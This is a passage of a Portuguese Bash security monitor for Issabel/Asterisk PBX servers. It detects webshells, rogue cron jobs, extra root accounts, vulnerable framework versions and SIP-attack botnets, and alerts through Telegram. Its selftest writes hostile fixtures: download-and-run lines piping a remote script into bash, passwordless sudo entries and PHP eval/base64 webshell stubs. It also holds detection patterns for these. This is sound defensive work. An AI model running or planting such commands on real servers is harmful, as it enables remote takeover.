          done
          if [ -z "$line" ]; then warn "ferramenta critica SEM pacote de origem (pode ser trocada/plantada): $real"; bad=$((bad+1)); continue; fi
          dg="$(echo "$line" | awk '{print $4}')"
          case "${#dg}" in 32) calc="$(md5sum "$real" 2>/dev/null | awk '{print $1}')" ;; 64) calc="$(sha256sum "$real" 2>/dev/null | awk '{print $1}')" ;; *) continue ;; esac
          [ "$calc" = "$dg" ] || { warn "ferramenta critica DIFERENTE do pacote original (possivel binario trocado): $real"; bad=$((bad+1)); }
        done
      done
      info "${n} ferramentas criticas conferidas com o hash do pacote; ${bad} divergencia(s). (Todos os pacotes: ipbx-sentinel --audit ${days} full)"
    fi
  else info "rpm nao disponivel"; fi

  sec "7. Arquivos alterados nos ultimos ${days} dias (fora do esperado)"
  find /etc /usr/local /opt /root /var/spool/cron /var/lib/asterisk/agi-bin /var/www/cgi-bin -type f -mtime "-${days}" 2>/dev/null \
    | grep -vE 'ipbx-sentinel|ipbx-watchdog|/etc/ipbx/|\.bash_history|/etc/(mtab|resolv|adjtime|asterisk/.*(cdr|queues_log)|alternatives|ld.so.cache)|/root/ipbx-' | head -40 | sed 's/^/  /'

  sec "8. Origem do ataque (logs do Apache x arquivos em quarentena)"
  if [ -d "$QUAR_ROOT" ]; then
    local q; q="$(find "$QUAR_ROOT" -type f ! -name INDEX.tsv -printf '%TY-%Tm-%Td %TH:%TM\n' 2>/dev/null | sort)"
    [ -n "$q" ] && info "arquivos em quarentena: $(echo "$q" | wc -l) | data de modificacao mais antiga: $(echo "$q" | head -1) | mais recente: $(echo "$q" | tail -1)  (a mais antiga indica quando o invasor entrou, no maximo; o invasor pode falsificar datas - confira tambem a data dos arquivos em /opt/sipsentinel e do /var/log/cron)"
  fi
  local pats; pats="$(mktemp)"
  awk -F'\t' '{n=$2; sub(/.*\//,"",n); print n}' "$QUAR_ROOT"/INDEX.tsv 2>/dev/null | sort -u | grep -vxE 'index\.php|config\.php|ajax\.php|configs\.php|config\.all\.php' > "$pats"
  if [ -s "$pats" ]; then
    local logs; logs="$(ls /var/log/httpd/*access_log* /var/log/apache2/*access* 2>/dev/null)"
    info "arquivos maliciosos distintos conhecidos: $(wc -l < "$pats")"
    for f in $logs; do case "$f" in *.gz) zcat "$f" 2>/dev/null;; *) cat "$f" 2>/dev/null;; esac; done | grep -F -f "$pats" | awk '{print $1}' | sort | uniq -c | sort -rn | head -10 | sed 's/^/     acessos aos arquivos maliciosos, por IP: /'
  else info "sem itens em quarentena para cruzar"; fi
  rm -f "$pats"

  sec "9. Asterisk (acessos externos e desvios)"
  awk '/^\[/{sec=$0} /^(permit|deny)/{print sec" "$0}' /etc/asterisk/manager.conf 2>/dev/null | grep -E 'permit *= *0\.0\.0\.0' | while read -r l; do warn "AMI aberto para qualquer origem: $l"; done
  grep -hiE '^ *bindaddr *= *0\.0\.0\.0' /etc/asterisk/manager.conf 2>/dev/null | head -1 | while read -r l; do warn "AMI escutando em todas as interfaces ($l): restrinja a 127.0.0.1 ou ao firewall"; done
  awk '/^\[/{sec=$0} /^(permit|deny)/{print sec" "$0}' /etc/asterisk/manager*.conf 2>/dev/null | grep -vE '^\[general\]' | grep -E 'permit *= *(0\.0\.0\.0|[0-9.]+/0\.0\.0\.0)' | head -5 | while read -r l; do warn "usuario AMI aceita qualquer origem: $l"; done
  grep -hiE '^ *allowguest *= *yes' /etc/asterisk/sip*.conf 2>/dev/null | head -1 | while read -r l; do warn "SIP aceita chamadas de visitante sem autenticacao ($l)"; done
  info "secao 9 verifica: AMI aberto, bindaddr 0.0.0.0, allowguest; dialplan malicioso e checado a cada minuto pelo monitor do host"
  grep -nE 'thanku-outcall|custom-get-extensions|Dial\(.*[0-9]{11,}' /etc/asterisk/extensions*.conf 2>/dev/null | head -5 | while read -r l; do warn "dialplan suspeito: $l"; done

  sec "RESUMO"
  if [ "$AF" -eq 0 ]; then echo "  Nenhum sinal de alerta encontrado nesta auditoria."; else echo "  ${AF} ponto(s) marcado(s) com [!] para voce revisar."; fi
  echo "  Esta auditoria so le o servidor. Reinstalar a partir de backup limpo continua sendo o caminho mais seguro apos um RCE."
  } 2>&1 | tee "$out"
  echo; echo "Relatorio salvo em: $out"
}

report_identity() {
  [ "${#IDENT_CHANGES[@]}" -gt 0 ] || return 0
  local msg c i=0
  msg="ALERTA DE CONTAS"$'\n'"Mudancas em usuarios/senhas desde a ultima verificacao:"$'\n'
  for c in "${IDENT_CHANGES[@]}"; do i=$((i+1)); [ $i -gt 12 ] && { msg+=$'\n'"... e mais $(( ${#IDENT_CHANGES[@]} - 12 ))"; break; }; msg+=$'\n'"- ${c}"; log "CONTAS: ${c}"; done
  msg+=$'\n\n'"Se voce NAO fez essa mudanca: troque as senhas agora, revise acessos recentes e rode ipbx-sentinel --scan."
  send_telegram "$msg"
}

report() {
  [ "${#FOUND[@]}" -gt 0 ] || return 0
  local msg line
  msg="ALERTA DE SEGURANCA"$'\n'
  [ "$SENTINEL_ACTION" = "quarantine" ] && msg+="Acao: item(ns) movido(s) para quarentena (reversivel)."$'\n' || msg+="Acao: apenas alerta (nada foi movido)."$'\n'
  local i=0
  for line in "${FOUND[@]}"; do
    i=$((i+1)); [ $i -gt 10 ] && { msg+="... e mais $(( ${#FOUND[@]} - 10 )) item(ns)."$'\n'; break; }
    IFS='|' read -r why f dest ips <<<"$line"
    msg+=$'\n'"- ${f}"$'\n'"  motivo: ${why}"
    [ -n "$ips" ] && msg+=$'\n'"  origem provavel: ${ips}"
  done
  msg+=$'\n\n'"Para ver/restaurar: ipbx-sentinel --list | --restore ARQUIVO"
  send_telegram "$msg"
}

# ------------------------------------------------------------------------------
# CHECKS DE HOST (herdados do antigo monitor_prisma.sh). Leves, rodam a cada minuto.
# ------------------------------------------------------------------------------
seen_once() {  # $1 = chave; devolve 0 so na primeira vez (evita alerta repetido a cada minuto)
  mkdir -p "$STATE_DIR" 2>/dev/null; chmod 700 "$STATE_DIR" 2>/dev/null
  local h; h="$(printf '%s' "$1" | sha256sum | awk '{print $1}')"
  grep -qxF "$h" "$STATE_DIR/host.seen" 2>/dev/null && return 1
  echo "$h" >> "$STATE_DIR/host.seen"; chmod 600 "$STATE_DIR/host.seen" 2>/dev/null
  return 0
}

seen_forget() {  # $1 = chave: esquece o alerta (a condicao sumiu; se voltar, avisa de novo)
  local h; h="$(printf '%s' "$1" | sha256sum | awk '{print $1}')"
  [ -f "$STATE_DIR/host.seen" ] && { grep -vxF "$h" "$STATE_DIR/host.seen" > "$STATE_DIR/host.seen.tmp" 2>/dev/null; mv -f "$STATE_DIR/host.seen.tmp" "$STATE_DIR/host.seen" 2>/dev/null; }
  return 0
}

check_firewall() {
  command -v systemctl >/dev/null 2>&1 || return 0
  local svc="" st rules bad=0 flag="$STATE_DIR/fw.down"
  mkdir -p "$STATE_DIR" 2>/dev/null
  if systemctl is-enabled iptables >/dev/null 2>&1 || systemctl is-active iptables >/dev/null 2>&1; then svc=iptables
  elif systemctl is-enabled firewalld >/dev/null 2>&1 || systemctl is-active firewalld >/dev/null 2>&1; then svc=firewalld; fi
  [ -n "$svc" ] || return 0
  st="$(systemctl is-active "$svc" 2>/dev/null)"; [ -n "$st" ] || st=inactive
  local why="parado (estado: ${st})"
  if [ "$st" != "active" ]; then bad=1
  elif [ "$svc" = "iptables" ]; then
    rules="$(iptables -L -n 2>/dev/null | wc -l)"
    if [ "${rules:-0}" -lt 10 ]; then bad=1; why="ativo, mas praticamente SEM REGRAS (${rules} linhas): o servidor esta aberto"; fi
  fi
  if [ "$bad" = "1" ]; then
    if [ ! -f "$flag" ]; then
      : > "$flag"
      log "FIREWALL: ${svc} ${why}."
      send_telegram "ALERTA: FIREWALL SEM PROTECAO"$'\n'"Servico: ${svc} - ${why}"$'\n'"Acao: $([ "$SENTINEL_FIREWALL_HEAL" = "1" ] && echo "reativando o firewall." || echo "apenas alerta.")"
    fi
    [ "$SENTINEL_FIREWALL_HEAL" = "1" ] && systemctl restart "$svc" >/dev/null 2>&1
  elif [ -f "$flag" ]; then
    rm -f "$flag"; log "FIREWALL: ${svc} restabelecido."
    send_telegram "Firewall restabelecido"
  fi
}

check_dialplan() {
  local g="${SENTINEL_DIALPLAN_GLOB:-/etc/asterisk/extensions*.conf}" hit
  # shellcheck disable=SC2086
  hit="$(grep -nE 'thanku-outcall|custom-get-extensions' $g 2>/dev/null | head -n 2)"
  [ -n "$hit" ] || return 0
  seen_once "dialplan|$hit" || return 0
  log "DIALPLAN malicioso: $hit"
  send_telegram "ALERTA: DIALPLAN MALICIOSO"$'\n'"Rotas piratas (thanku-outcall) encontradas no Asterisk:"$'\n'"${hit}"$'\n\n'"Nada foi alterado. Rode ipbx-security para limpar."
}

cron_of() {  # $1 = usuario
  if [ -n "${SENTINEL_CRON_DIR:-}" ]; then cat "$SENTINEL_CRON_DIR/$1" 2>/dev/null; else crontab -l -u "$1" 2>/dev/null; fi
}

check_cron() {
  local a r msg=""
  a="$(cron_of asterisk | grep -v '^#' | grep -E 'php|sh|wget|curl|cache|supportpbx|emad' | head -n 1)"
  r="$(cron_of root | grep -v '^#' | grep -E 'postroot|212\.83\.160|curl.*http|wget.*http|python.*http' | head -n 1)"
  [ -n "$a$r" ] || return 0
  seen_once "cron|$a|$r" || return 0
  [ -n "$a" ] && msg+=$'\n'"usuario asterisk: ${a}"
  [ -n "$r" ] && msg+=$'\n'"usuario root: ${r}"
  log "CRON suspeito:${msg//$'\n'/ | }"
  send_telegram "ALERTA: CRONTAB SUSPEITO${msg}"$'\n\n'"Nada foi alterado. Revise com: crontab -l -u asterisk"
}

# Aviso oficial Issabel (02/08/2026): issabel-framework <= 4.0.0-12 (Issabel 4) ou <= 5.0.0-3
# (Issabel 5) permite controle remoto. Detecta a versao e o repositorio de correcao certo.
FW_VER=""; FW_FIX_REPO=""
framework_vulnerable() {  # 0 = vulneravel (preenche FW_VER e FW_FIX_REPO)
  local v="${SENTINEL_FRAMEWORK_VER:-}" ver rel major lim_rel vuln=0
  if [ -z "$v" ]; then
    command -v rpm >/dev/null 2>&1 || return 1
    v="$(rpm -q --qf '%{VERSION}-%{RELEASE}' issabel-framework 2>/dev/null)" || return 1
  fi
  case "$v" in [0-9]*-*) ;; *) return 1 ;; esac
  ver="${v%%-*}"; rel="${v#*-}"; rel="${rel%%[!0-9]*}"; rel="${rel:-0}"; major="${ver%%.*}"
  case "$major" in
    4) lim_rel=12; FW_FIX_REPO=issabel-updates ;;
    5) lim_rel=3;  FW_FIX_REPO=issabel-cinco-updates ;;
    *) return 1 ;;
  esac
  if [ "$ver" = "$major.0.0" ]; then [ "$rel" -le "$lim_rel" ] && vuln=1
  elif [ "$(printf '%s\n%s\n' "$ver" "$major.0.0" | sort -V | head -1)" = "$ver" ]; then vuln=1; fi
  FW_VER="$v"; [ "$vuln" = "1" ]
}

check_framework() {  # so alerta (cron de 1 min); a correcao e feita por --update-framework
  framework_vulnerable || return 0
  seen_once "framework|$FW_VER" || return 0
  log "FRAMEWORK vulneravel: issabel-framework ${FW_VER}"
  send_telegram "ALERTA: ATUALIZACAO DE SEGURANCA PENDENTE"$'\n'"issabel-framework ${FW_VER} tem falha critica (aviso oficial de 02/08/2026) que permite controle remoto do servidor."$'\n\n'"Corrija com: ipbx-sentinel --update-framework (faz snapshot antes)."$'\n'"A atualizacao NAO remove malware ja instalado: rode ipbx-sentinel --scan."
}

snapshot_pre_update() {  # $1 = descricao (regra de snapshot pre-atualizacao)
  local ts dir root="${SENTINEL_BACKUP_ROOT:-/var/backup/ipbx}" f
  ts="$(date '+%Y-%m-%d_%H%M%S')"; dir="$root/backup_${ts}"
  mkdir -p "$dir/html" "$dir/db" "$dir/asterisk" 2>/dev/null || return 1
  echo "$1 - $(date '+%d/%m/%Y as %H:%M:%S')" > "$dir/manifesto.txt"
  for f in /var/www/db/menu.db /var/www/db/acl.db; do [ -f "$f" ] && cp -pf "$f" "$dir/db/" 2>/dev/null; done
  for f in extensions_custom.conf extensions_override_issabelpbx.conf features_general_custom.conf pjsip.conf pjsip_custom.conf; do [ -f "/etc/asterisk/$f" ] && cp -pf "/etc/asterisk/$f" "$dir/asterisk/" 2>/dev/null; done
  crontab -l > "$dir/crontab.txt" 2>/dev/null
  rpm -qa 2>/dev/null | grep -i issabel | sort > "$dir/pacotes-issabel.txt"
  ln -sfn "$dir" "$root/latest" 2>/dev/null
  echo "$dir"
}

cmd_update_framework() {
  framework_vulnerable || { echo "issabel-framework ${FW_VER:-nao encontrado}: nada a corrigir."; return 0; }
  local pm snap rc old="$FW_VER"
  pm="$(command -v yum || command -v dnf)"; [ -n "$pm" ] || { echo "yum/dnf nao encontrado."; return 1; }
  snap="$(snapshot_pre_update "Atualizacao de seguranca issabel-framework ${old} (aviso oficial 02/08/2026)")" || { echo "Snapshot falhou; atualizacao cancelada."; return 1; }
  echo "Snapshot gravado em: $snap"
  echo "Atualizando issabel-framework ($old) pelo repositorio ${FW_FIX_REPO}..."
  timeout 900 "$pm" -y --disablerepo='*' --enablerepo="$FW_FIX_REPO" update issabel-framework >> "$LOG_FILE" 2>&1; rc=$?
  SENTINEL_FRAMEWORK_VER=""
  if [ $rc -eq 0 ] && ! framework_vulnerable; then
    local nv; nv="$(rpm -q --qf '%{VERSION}-%{RELEASE}' issabel-framework 2>/dev/null)"
    log "FRAMEWORK atualizado: ${old} -> ${nv}"
    send_telegram "issabel-framework atualizado com sucesso em ${HOSTNAME_S}: ${old} -> ${nv} ($(date '+%d/%m/%Y %H:%M:%S')). Snapshot: ${snap}. A atualizacao nao remove malware antigo: rode ipbx-sentinel --scan."
    echo "OK: ${old} -> ${nv}"
  else
    log "FRAMEWORK: falha ao atualizar (codigo ${rc}); ver ${LOG_FILE}"
    send_telegram "FALHA ao atualizar issabel-framework em ${HOSTNAME_S} (versao ${old}). Rode manualmente: ${pm} --disablerepo=* --enablerepo=${FW_FIX_REPO} update issabel-framework. Snapshot: ${snap}"
    echo "FALHA ao atualizar (codigo $rc). Detalhes em ${LOG_FILE}"; return 1
  fi
}

# Persistencia de invasor com poderes de root (caso real Issabel 4): conta UID 0 extra,
# rc.local baixando e executando script remoto (postroot.sh) e sudo sem senha para tudo.
# So ALERTA, uma vez por achado; nunca altera nada.
persist_alert() {  # $1 = chave de deduplicacao, $2 = mensagem
  seen_once "persist|$1" || return 0
  log "PERSISTENCIA: $2"
  send_telegram "ALERTA: PERSISTENCIA DE INVASOR"$'\n'"$2"$'\n\n'"Nada foi alterado. Rode: ipbx-sentinel --audit  (com root comprometido, o caminho mais seguro e reinstalar a partir de backup limpo)."
}

check_persistence() {
  local u l f cur known="$STATE_DIR/uid0.known"
  cur="$(awk -F: '$3==0 && $1!="root"{print $1}' "${SENTINEL_PASSWD:-/etc/passwd}" 2>/dev/null)"
  # Conta UID 0 que foi apagada e voltou (o invasor recria) tem de alertar de novo: esquece as que sumiram.
  if [ -f "$known" ]; then
    while read -r u; do [ -n "$u" ] && ! printf '%s\n' "$cur" | grep -qxF "$u" && seen_forget "persist|uid0|$u"; done < "$known"
  fi
  mkdir -p "$STATE_DIR" 2>/dev/null; printf '%s\n' "$cur" | sed '/^$/d' > "$known" 2>/dev/null
  while read -r u; do [ -n "$u" ] && persist_alert "uid0|$u" "usuario com poderes de root alem do root: $u (UID 0)"; done <<< "$cur"
  for f in ${SENTINEL_RCLOCAL:-/etc/rc.local /etc/rc.d/rc.local}; do
    [ -r "$f" ] || continue
    while read -r l; do [ -n "$l" ] && persist_alert "rc|$f|$l" "$f baixa e executa script remoto a cada boot: $l"; done \
      < <(grep -vE '^\s*#' "$f" 2>/dev/null | grep -E '(curl|wget)[^|]*\|[^|]*(ba)?sh|postroot|212\.83\.160|104\.194\.143')
  done
  # shellcheck disable=SC2086
  while read -r l; do [ -n "$l" ] && persist_alert "sudo|$l" "sudo SEM SENHA para qualquer comando: $l"; done \
    < <(cat ${SENTINEL_SUDOERS:-/etc/sudoers /etc/sudoers.d/*} 2>/dev/null | grep -vE '^\s*#' | grep -E 'NOPASSWD:\s*ALL\s*$')
}

# Atributo imutavel/append-only em arquivos criticos: truque de invasor para impedir a
# remocao de contas e persistencias (chattr +i /etc/passwd). So alerta.
check_immutable() {
  command -v lsattr >/dev/null 2>&1 || return 0
  local f a
  for f in ${SENTINEL_ATTR_FILES:-/etc/passwd /etc/shadow /etc/group /etc/gshadow /etc/sudoers /etc/rc.local /etc/rc.d/rc.local /etc/crontab /etc/ld.so.preload /var/spool/cron/root /var/spool/cron/asterisk}; do
    [ -e "$f" ] || continue
    a="$(lsattr -d "$f" 2>/dev/null | awk '{print $1}')"
    case "$a" in
      *i*|*a*) persist_alert "attr|$f|$a" "arquivo critico PROTEGIDO contra alteracao (atributo ${a}), truque de invasor para impedir a remocao de contas/persistencias: $f  (para remover: chattr -i -a $f)" ;;
    esac
  done
}

# Agente de botnet de ataque SIP (caso real: "SIP Sentinel" em /opt/sipsentinel, usa SIPVicious/svmap
# para varrer redes de terceiros e tentar chamadas fraudulentas). So alerta, uma vez por achado.
check_botnet() {
  local d p
  for d in ${SENTINEL_BOTNET_DIRS:-/opt/sipsentinel /etc/sipsentinel /tmp/.sipvicious-home}; do
    [ -e "$d" ] && persist_alert "botnet|dir|$d" "pasta de ferramenta de ataque SIP encontrada: $d (agente que varre redes de terceiros e tenta chamadas fraudulentas)"
  done
  p="$(pgrep -af 'sipsentinel/agent\.py|svmap|svwar|svcrack|sipvicious' 2>/dev/null | head -1)"
  [ -n "$p" ] && persist_alert "botnet|proc" "processo de varredura/ataque SIP em execucao neste servidor: $(echo "$p" | cut -c1-120)"
}

host_checks() { check_firewall; check_dialplan; check_cron; check_framework; check_persistence; check_immutable; check_botnet; }

do_scan() {
  local mode="$1"
  [ -d "$WEB_DIR" ] || { log "Diretorio web $WEB_DIR nao existe."; return 0; }
  host_checks
  scan_rogue_modules
  scan_static_php
  scan_signatures "$mode"
  [ "$mode" = "full" ] && heal_perms
  report
  identity_check
  report_identity
  [ "${#FOUND[@]}" -eq 0 ] && [ "${#IDENT_CHANGES[@]}" -eq 0 ] && log "Varredura ($mode) concluida: nada suspeito."
  return 0
}

migrate_old_monitor() {
  # Une o antigo monitor_prisma.sh ao Sentinel: preserva credenciais do Telegram
  # (sem exibi-las), remove cron/arquivos antigos e o watchdog antigo (token fixo).
  local old_found=0 f
  for f in /usr/local/bin/monitor_prisma.sh /usr/local/bin/monitor_issabel_users.sh /etc/ipbx/monitor_prisma.sh; do [ -e "$f" ] && old_found=1; done
  if [ ! -s "$TG_CONF" ]; then
    load_telegram
    if [ -n "$TELEGRAM_BOT_TOKEN" ] && [ -n "$TELEGRAM_CHAT_ID" ]; then
      ( umask 077; printf 'TELEGRAM_BOT_TOKEN="%s"\nTELEGRAM_CHAT_ID="%s"\n' "$TELEGRAM_BOT_TOKEN" "$TELEGRAM_CHAT_ID" > "$TG_CONF" )
      chmod 600 "$TG_CONF"; echo "Credenciais do Telegram copiadas para $TG_CONF (modo 600). Troque o token no BotFather e edite esse arquivo."
    elif [ "$old_found" = "1" ]; then
      echo "AVISO: monitor antigo sem credenciais legiveis; crie $TG_CONF (TELEGRAM_BOT_TOKEN / TELEGRAM_CHAT_ID)."
    fi
  fi
  if crontab -l 2>/dev/null | grep -q 'monitor_issabel_users.sh'; then
    crontab -l 2>/dev/null | grep -v 'monitor_issabel_users.sh' | crontab - && echo "Cron do monitor antigo removido (o Sentinel assume)."
  fi
  rm -f /usr/local/bin/monitor_prisma.sh /usr/local/bin/monitor_issabel_users.sh /etc/ipbx/monitor_prisma.sh
  return 0
}

cmd_install() {
  local a prev="" cli="" noupd=0
  for a in "$@"; do [ "$prev" = "--cliente" ] && cli="$a"; [ "$a" = "--no-update" ] && noupd=1; prev="$a"; done
  mkdir -p /etc/ipbx "$QUAR_ROOT" /var/backup/ipbx
  chmod 700 "$QUAR_ROOT" 2>/dev/null
  local self; self="$(readlink -f "$0" 2>/dev/null || echo "$0")"
  if [ -f "$self" ] && [ "$self" != "/usr/local/bin/ipbx-sentinel" ]; then /bin/cp -f "$self" /usr/local/bin/ipbx-sentinel; fi
  chmod +x /usr/local/bin/ipbx-sentinel
  /bin/cp -pf /usr/local/bin/ipbx-sentinel /etc/ipbx/ipbx-sentinel.bak 2>/dev/null   # copia para o watchdog
  if [ ! -f "$CONF_FILE" ]; then
    printf '# IPbx Sentinel\nSENTINEL_ACTION=quarantine\nSENTINEL_HEAL_PERMS=0\nSENTINEL_FIREWALL_HEAL=0\n' > "$CONF_FILE"; chmod 600 "$CONF_FILE"
  fi
  [ -f "$ALLOW_FILE" ] || { printf '# Caminhos/globs liberados (um por linha). Ex.: /var/www/html/meu_modulo/*\n' > "$ALLOW_FILE"; chmod 600 "$ALLOW_FILE"; }
  cat > /etc/cron.d/ipbx-sentinel <<'CRON'
# IPbx Sentinel - monitor unico de seguranca
* * * * * root /usr/bin/flock -n /var/run/ipbx-sentinel-host.lock /usr/bin/nice -n 19 /usr/local/bin/ipbx-sentinel --host >/dev/null 2>&1
*/5 * * * * root /usr/bin/flock -n /var/run/ipbx-sentinel.lock /usr/bin/nice -n 19 /usr/local/bin/ipbx-sentinel --incremental >/dev/null 2>&1
CRON
  chmod 644 /etc/cron.d/ipbx-sentinel
  # Watchdog (sem credenciais): se o Sentinel ou seu cron forem apagados, restaura e avisa
  cat > /etc/cron.d/ipbx-watchdog <<'WD'
* * * * * root [ -x /usr/local/bin/ipbx-sentinel ] && [ -f /etc/cron.d/ipbx-sentinel ] || { [ -f /etc/ipbx/ipbx-sentinel.bak ] && /bin/cp -pf /etc/ipbx/ipbx-sentinel.bak /usr/local/bin/ipbx-sentinel && chmod +x /usr/local/bin/ipbx-sentinel && /usr/local/bin/ipbx-sentinel --install --no-update >/dev/null 2>&1 && /usr/local/bin/ipbx-sentinel --alert-restored >/dev/null 2>&1; }
WD
  chmod 644 /etc/cron.d/ipbx-watchdog
  migrate_old_monitor
  # Nome do cliente nos alertas: automatico (nome do host). --cliente "Nome" so se quiser sobrescrever.
  if [ -n "$cli" ]; then set_cliente "$cli"; else echo "Cliente nos alertas: ${CLIENTE_NOME} (automatico, do nome do host; para mudar: ipbx-sentinel --set-cliente \"Nome\")"; fi
  echo "Sentinel instalado: /usr/local/bin/ipbx-sentinel + /etc/cron.d/ipbx-sentinel (host a cada 1 min, arquivos alterados a cada 5 min; sem varredura noturna)."
  echo "Telegram: $TG_CONF (TELEGRAM_BOT_TOKEN / TELEGRAM_CHAT_ID). Teste: ipbx-sentinel --test-alert"
  identity_status
  if [ "$noupd" != "1" ] && [ "${SENTINEL_AUTO_UPDATE_FRAMEWORK:-1}" = "1" ]; then cmd_update_framework; fi
  echo "Varredura completa inicial (uma vez; depois so quando voce pedir: ipbx-sentinel --scan)..."
  do_scan full
}

cmd_list() { if [ -s "$QUAR_ROOT/INDEX.tsv" ]; then awk -F'\t' '{printf "%s | %s | %s\n   -> %s\n", $1, $4, $2, $3}' "$QUAR_ROOT/INDEX.tsv"; else echo "Quarentena vazia."; fi; }

cmd_restore() {
  local f="$1" dest
  [ -n "$f" ] || { echo "Informe o caminho original."; return 1; }
  dest="$(awk -F'\t' -v p="$f" '$2==p {d=$3} END{print d}' "$QUAR_ROOT/INDEX.tsv" 2>/dev/null)"
  [ -n "$dest" ] && [ -e "$dest" ] || { echo "Nao encontrado na quarentena: $f"; return 1; }
  chmod 644 "$dest" 2>/dev/null; mkdir -p "$(dirname "$f")" && mv -f "$dest" "$f" && echo "Restaurado: $f"
  echo "Dica: para nao ser pego de novo, adicione o caminho em $ALLOW_FILE"
}

cmd_selftest() {
  local T; T="$(mktemp -d)"; local ok=0 bad=0
  mkdir -p "$T/web/admin/modules/phones" "$T/web/admin/modules/core" "$T/web/images" "$T/web/admin/libraries/php-upgrade" "$T/web/modules"
  echo '<?php /* Emad__Was__Here */ ?>'                       > "$T/web/modules/a_emad.php"
  echo '<?php eval($Yv($qjOe($Ad("AAAA")))); ?>'              > "$T/web/modules/b_chain.php"
  echo '<?php eval(base64_decode("AAAA")); ?>'                > "$T/web/modules/c_decode.php"
  echo '<?php echo "ola"; ?>'                                  > "$T/web/images/d_static.php"
  echo '<?php echo "ok"; ?>'                                   > "$T/web/modules/legitimo.php"
  echo '<?php eval($x($y("z"))); ?>'                          > "$T/web/admin/libraries/php-upgrade/compat.php"
  echo '<?php $v = doubleval($a); ?>'                          > "$T/web/admin/modules/core/XML_Unserializer.php"
  echo 'x' > "$T/web/admin/modules/phones/index.php"
  mkdir -p "$T/bin" "$T/cron"
  printf '#!/bin/bash\ncase "$1" in is-enabled) exit 0;; is-active) echo inactive; exit 3;; *) exit 0;; esac\n' > "$T/bin/systemctl"; chmod +x "$T/bin/systemctl"
  echo 'exten => s,1,Goto(thanku-outcall,s,1)' > "$T/extensions_custom.conf"
  echo '* * * * * curl http://exemplo.invalido/x | sh' > "$T/cron/asterisk"
  printf 'root:x:0:0:root:/root:/bin/bash\nyum:x:0:0::/home/yum:/bin/bash\nabort:x:0:0::/:/bin/bash\nasterisk:x:100:100::/:/bin/bash\n' > "$T/passwd"
  printf '#!/bin/bash\n/usr/local/sbin/motd.sh > /etc/motd\nbash -c "curl -ks http://203.0.113.9/r/postroot.sh|bash"\n' > "$T/rc.local"
  printf 'asterisk ALL = NOPASSWD: /sbin/service\nasterisk ALL=(ALL) NOPASSWD: ALL\n' > "$T/sudoers"
  mkdir -p "$T/botdir"
  printf '#!/bin/bash\nprintf -- "----i---------e-- %%s\\n" "$2"\n' > "$T/bin/lsattr"; chmod +x "$T/bin/lsattr"
  ( PATH="$T/bin:$PATH" WEB_DIR="$T/web" SENTINEL_QUAR="$T/quar" SENTINEL_LOG="$T/log" SENTINEL_NO_ALERT=1 SENTINEL_CONF=/nonexistent SENTINEL_ALLOW=/nonexistent SENTINEL_STATE="$T/state" SENTINEL_ACL_DB=/nonexistent SENTINEL_CRED_FILES="" SENTINEL_FIREWALL_HEAL=0 SENTINEL_DIALPLAN_GLOB="$T/extensions*.conf" SENTINEL_CRON_DIR="$T/cron" SENTINEL_FRAMEWORK_VER="4.0.0-12" SENTINEL_PASSWD="$T/passwd" SENTINEL_RCLOCAL="$T/rc.local" SENTINEL_SUDOERS="$T/sudoers" SENTINEL_ATTR_FILES="$T/passwd" SENTINEL_BOTNET_DIRS="$T/botdir" "$0" --scan >/dev/null 2>&1 )
  chk() { if [ "$2" = "gone" ] && [ ! -e "$1" ]; then ok=$((ok+1)); elif [ "$2" = "kept" ] && [ -e "$1" ]; then ok=$((ok+1)); else bad=$((bad+1)); echo "FALHA: $1 deveria estar '$2'"; fi; }
  chk "$T/web/modules/a_emad.php" gone;  chk "$T/web/modules/b_chain.php" gone;  chk "$T/web/modules/c_decode.php" gone
  chk "$T/web/images/d_static.php" gone; chk "$T/web/admin/modules/phones" gone
  chk "$T/web/modules/legitimo.php" kept; chk "$T/web/admin/libraries/php-upgrade/compat.php" kept; chk "$T/web/admin/modules/core/XML_Unserializer.php" kept
  for k in "FIREWALL: iptables parado" "DIALPLAN malicioso" "CRON suspeito" "FRAMEWORK vulneravel" "PERSISTENCIA: usuario com poderes de root alem do root: yum" "PERSISTENCIA: usuario com poderes de root alem do root: abort" "baixa e executa script remoto a cada boot" "sudo SEM SENHA para qualquer comando" "PROTEGIDO contra alteracao" "ferramenta de ataque SIP"; do
    if grep -qF "$k" "$T/log"; then ok=$((ok+1)); else bad=$((bad+1)); echo "FALHA: alerta '$k' nao gerado"; fi
  done
  rm -rf "$T"
  echo "Selftest: $ok ok, $bad falha(s)."; [ "$bad" -eq 0 ]
}

case "${1:-}" in
  --install)     shift; cmd_install "$@" ;;
  --set-cliente) set_cliente "$2" "$3" ;;
  --uninstall)   rm -f /etc/cron.d/ipbx-sentinel; echo "Cron do Sentinel removido." ;;
  --list)        cmd_list ;;
  --restore)     cmd_restore "$2" ;;
  --baseline)    mkdir -p "$STATE_DIR"; rm -f "$STATE_DIR/identity.baseline"; identity_check; echo "Foto de contas/senhas refeita ($(wc -l < "$STATE_DIR/identity.baseline" 2>/dev/null || echo 0) itens)." ;;
  --selftest)    cmd_selftest ;;
  --test-alert)  send_telegram "Teste do IPbx Sentinel"$'\n'"Se esta mensagem chegou, o alerta esta funcionando e identifica o cliente acima." ; echo "Enviado (se o Telegram estiver configurado)." ;;
  --incremental) do_scan inc ;;
  --host)        host_checks ;;
  --status)      identity_status ;;
  --audit)       cmd_audit "$2" "$3" ;;
  --update-framework) cmd_update_framework ;;
  --alert-restored) send_telegram "ALERTA: IPBX SENTINEL APAGADO E RESTAURADO"$'\n'"O Sentinel (ou seu agendamento) foi apagado e restaurado automaticamente. Investigue quem tem acesso root." ;;
  --scan|"")     do_scan full ;;
  *) echo "Uso: $0 [--scan|--incremental|--host|--status|--audit [DIAS] [full]|--update-framework|--install|--uninstall|--list|--restore ARQ|--baseline|--test-alert|--selftest]"; exit 1 ;;
esac
exit 0
